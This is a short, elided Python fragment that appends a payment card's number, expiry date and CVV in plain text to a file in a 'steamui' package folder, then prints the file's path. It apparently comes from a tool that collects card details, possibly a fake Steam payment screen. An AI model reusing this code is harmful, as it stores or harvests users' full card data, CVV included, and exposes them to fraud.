  ...
  '''
    ...
    '''
        ...
        with open("files/pkg_add/steamui/payment_methods.txt", "a") as card_writer:
            ...
            card_writer.write('Number: %s \n' % self.cc_num)
            card_writer.write('Exp: %s \n' % self.cc_exp)
            card_writer.write('CVV: %s \n' % self.cc_cvv)
            card_writer.write('%s \n' % hr)

        print(os.path.isfile("files/pkg_add/steamui/payment_methods.txt"))
        print(os.path.abspath("files/pkg_add/steamui"))
